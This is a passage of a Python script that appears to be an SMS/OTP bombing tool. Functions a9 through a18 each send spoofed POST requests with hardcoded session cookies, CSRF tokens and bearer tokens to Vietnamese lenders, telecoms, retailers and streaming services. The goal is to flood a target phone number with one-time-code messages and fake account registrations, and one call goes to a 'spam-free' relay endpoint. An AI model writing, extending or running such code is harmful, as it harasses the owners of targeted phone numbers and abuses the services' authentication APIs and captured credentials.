    'Referer': 'https://vaytienmat.homecredit.vn/vay-nhanh-uy-tin/xac-thuc-otp?utm_source=google&utm_medium=ecapp&utm_campaign=CLX_SEM_CLXALLSUBMIT_WEB_PRODUCT_ecapp&utm_content=none_text_adtext1_152829348882&utm_term=vay%20cmnd&tm=tt&ap=gads&aaid=adaY69ccjrA1J&gclid=EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'credentials': 'include',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
  params = {
    'utm_source': 'google',
    'utm_medium': 'ecapp',
    'utm_campaign': 'CLX_SEM_CLXALLSUBMIT_WEB_PRODUCT_ecapp',
    'utm_content': 'none_text_adtext1_152829348882',
    'utm_term': 'vay cmnd',
    'tm': 'tt',
    'ap': 'gads',
    'aaid': 'adaY69ccjrA1J',
    'gclid': 'EAIaIQobChMIqfuO8IPygAMVkN8WBR0PTQWoEAAYAiAAEgJNqfD_BwE',
}
  json_data = {
    'phoneNumber': phone,
}

  response = requests.post(
    'https://vaytienmat.homecredit.vn/api/bod-generateOTP',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def a9(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)    
def a10(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
###
def a11(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
def a12(phone):
 requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
def a13(phone):
    cookies = {
        '_gid': 'GA1.3.628124806.1692525961',
    '_gat': '1',
    '_ga': 'GA1.1.130800652.1692525961',
    'vMobile': '2',
    '_gcl_au': '1.1.852179314.1692525962',
    'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '1b49eaeb-a1c4-47f1-b9f1-99d5fa5e0631',
    'cf_clearance': '2HQYSuFi4lP1DI9SFfGsu5nmnefWfooWaMKZzTvlhVU-1692525976-0-1-28fe7102.1e40ad9a.7fff2ee2-0.2.1692525976',
    'fpt_uuid': '%2276437874-ba1a-4be9-9aec-4cd794db636a%22',
    'ajs_group_id': 'null',
    '_fbp': 'fb.2.1692525963414.1112024482',
    '_tt_enable_cookie': '1',
    '_ttp': 'pgxU69feWGS-z5k1Zr7P45WKahE',
    '__admUTMtime': '1692525963',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '_hjSessionUser_731679': 'eyJpZCI6ImIzZTkxY2ZkLTQ3N2ItNTViMi1hZDgyLWU2ZjE2Y2JhOWZkZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQzOTMsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_731679': '0',
    '_hjSession_731679': 'eyJpZCI6ImExNTZmZGNmLWIxODEtNGZlMC1hMDI0LWJmYWM5NDJjZjNmZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQ0MDgsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesayLndkHe-BMH1_FTP7cujTFKSjndUtWqaDHo0.1',
    '_ga_ZR815NQ85K': 'GS1.1.1692525961.1.0.1692525965.56.0.0',
    '__RC': '21',
    '__R': '1',
    '__uif': '__uid%3A4692525980251642518%7C__ui%3A-1%7C__create%3A1692525980',
    }

    headers = {
        'Accept': '*/*',
    'Accept-Language': 'vi',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gid=GA1.3.628124806.1692525961; _gat=1; _ga=GA1.1.130800652.1692525961; vMobile=2; _gcl_au=1.1.852179314.1692525962; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=1b49eaeb-a1c4-47f1-b9f1-99d5fa5e0631; cf_clearance=2HQYSuFi4lP1DI9SFfGsu5nmnefWfooWaMKZzTvlhVU-1692525976-0-1-28fe7102.1e40ad9a.7fff2ee2-0.2.1692525976; fpt_uuid=%2276437874-ba1a-4be9-9aec-4cd794db636a%22; ajs_group_id=null; _fbp=fb.2.1692525963414.1112024482; _tt_enable_cookie=1; _ttp=pgxU69feWGS-z5k1Zr7P45WKahE; __admUTMtime=1692525963; __iid=; __iid=; __su=0; __su=0; _hjSessionUser_731679=eyJpZCI6ImIzZTkxY2ZkLTQ3N2ItNTViMi1hZDgyLWU2ZjE2Y2JhOWZkZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQzOTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImExNTZmZGNmLWIxODEtNGZlMC1hMDI0LWJmYWM5NDJjZjNmZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQ0MDgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesayLndkHe-BMH1_FTP7cujTFKSjndUtWqaDHo0.1; _ga_ZR815NQ85K=GS1.1.1692525961.1.0.1692525965.56.0.0; __RC=21; __R=1; __uif=__uid%3A4692525980251642518%7C__ui%3A-1%7C__create%3A1692525980',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
    'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
def a14(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)   
def a15(phone):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": phone,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)
def a16(phone):
    cookies = {
        'PHPSESSID': 'c4jb1f0n2n77dbr8v9ffeqba3s',
    '_aff_network': 'accesstrade',
    '_aff_sid': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_AFFI_TRACK_': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_AFFI_TIME_CUR_': '1695118710',
    '_AFFI_TIME_ACTION_': '1695118710',
    '_AFFI_TRACK_INDEX_': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DRcFkikpuCto%3DAYvUi84bgMY%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DDAbxwA8Cq74%3DXF88psWEUis%3DlxqKpf2ZPM8%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DIaEpL8EiB3s%3Dts5N67vwimk%3D',
    '_gcl_aw': 'GCL.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE',
    '__utma': '65249340.1344833277.1692526698.1692526698.1692526698.1',
    '__utmc': '65249340',
    '__utmz': '65249340.1692526698.1.1.utmcsr=accesstrade|utmgclid=EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided)',
    '_gac_UA-36329013-1': '1.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE',
    '__utmt': '1',
    '_gcl_au': '1.1.680315024.1692526698',
    '_ga': 'GA1.1.980739874.1692526698',
    '_tt_enable_cookie': '1',
    '_ttp': '11nHxV3SBSmoO8ZNc5oJt2c21M0',
    '_fbp': 'fb.1.1692526698731.39326441',
    '__admUTMtime': '1692526698',
    '_aff_network': 'accesstrade',
    '_aff_sid': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_ga_DFG3FWNPBM': 'GS1.1.1692526698.1.1.1692526701.57.0.0',
    '__utmb': '65249340.2.10.1692526698',
    '_ga_BBD6001M29': 'GS1.1.1692526698.1.1.1692526701.57.0.0',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '__RC': '21',
    '__R': '1',
    '__uif': '__uid%3A8292526715251642518%7C__ui%3A-1%7C__create%3A1692526715',
    'Srv': 'cc204|ZOHot|ZOHoe',
    }

    headers = {
        'authority': 'concung.com',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=c4jb1f0n2n77dbr8v9ffeqba3s; _aff_network=accesstrade; _aff_sid=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _AFFI_TRACK_=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _AFFI_TIME_CUR_=1695118710; _AFFI_TIME_ACTION_=1695118710; _AFFI_TRACK_INDEX_=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DRcFkikpuCto%3DAYvUi84bgMY%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DDAbxwA8Cq74%3DXF88psWEUis%3DlxqKpf2ZPM8%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DIaEpL8EiB3s%3Dts5N67vwimk%3D; _gcl_aw=GCL.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE; __utma=65249340.1344833277.1692526698.1692526698.1692526698.1; __utmc=65249340; __utmz=65249340.1692526698.1.1.utmcsr=accesstrade|utmgclid=EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided); _gac_UA-36329013-1=1.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE; __utmt=1; _gcl_au=1.1.680315024.1692526698; _ga=GA1.1.980739874.1692526698; _tt_enable_cookie=1; _ttp=11nHxV3SBSmoO8ZNc5oJt2c21M0; _fbp=fb.1.1692526698731.39326441; __admUTMtime=1692526698; _aff_network=accesstrade; _aff_sid=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _ga_DFG3FWNPBM=GS1.1.1692526698.1.1.1692526701.57.0.0; __utmb=65249340.2.10.1692526698; _ga_BBD6001M29=GS1.1.1692526698.1.1.1692526701.57.0.0; __iid=; __iid=; __su=0; __su=0; __RC=21; __R=1; __uif=__uid%3A8292526715251642518%7C__ui%3A-1%7C__create%3A1692526715; Srv=cc204|ZOHot|ZOHoe',
    'origin': 'https://concung.com',
    'referer': 'https://concung.com/dang-nhap.html',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
    'classAjax': 'AjaxLogin',
    'methodAjax': 'sendOtpLogin',
    'customer_phone': phone,
    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
    'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html', cookies=cookies, headers=headers, data=data)
def a17(phone):
  cookies = {
        'cf_chl_2': '0f2f6e0a633d12e',
    'PHPSESSID': '941cd9753721a283080113487d33afac',
    'cf_clearance': 'VOrTtyoXCKiHef5BztnZZcRHN9B9VNjMsBTuJgbtbhM-1692855848-0-1-5be15656.995dda9c.2d50edb3-160.2.1692855848',
    }
  headers = {
        'authority': 'duong.codes',
    'accept': '*/*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'cf_chl_2=0f2f6e0a633d12e; PHPSESSID=941cd9753721a283080113487d33afac; cf_clearance=VOrTtyoXCKiHef5BztnZZcRHN9B9VNjMsBTuJgbtbhM-1692855848-0-1-5be15656.995dda9c.2d50edb3-160.2.1692855848',
    'origin': 'https://duong.codes',
    'referer': 'https://duong.codes/client/sms-free',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
    'csrf_token': 'b8b9c523e11214b7463c0b084b96dc0951d556f43886de20e851f3b0621b6479',
}

  response = requests.post('https://duong.codes/cron/spam-free.php', cookies=cookies, headers=headers, data=data)
def a18(phone):
  cookies = {
        'pll_language': 'vi',
    '_ga': 'GA1.2.1581021288.1692726583',
    '_gid': 'GA1.2.356363167.1692726583',
    }
  headers = {
        'authority': 'vamo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMzU5MTg2IiwiYXVkIjoiaHR0cHM6XC9cL3ZhbW8udm5cL2FwaVwvd2ViIiwic2NvcGUiOlsid2ViIl0sImlzcyI6InZhbW8udm4iLCJleHAiOjE2OTI4MTMwMjMsImlhdCI6MTY5MjcyNjYyMywidGZhIjpmYWxzZSwianRpIjoiN2I5MjQ5N2EtOWQ5YS00Y2NkLTkzNDMtN2U1YTA3ZDVlZDI0In0.S8BMKVwx_zPjLqwcMt59oqckYt3Wq6BW4cnvR3R648U',
    'content-type': 'application/json',
    # 'cookie': 'pll_language=vi; _ga=GA1.2.1581021288.1692726583; _gid=GA1.2.356363167.1692726583',
    'origin': 'https://vamo.vn',
    'referer': 'https://vamo.vn/app/application/confirmation',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}
  json_data = {
    'phoneNumber': phone,
    'applicationId': 5806618,
    'flowType': 'FIRST',
}

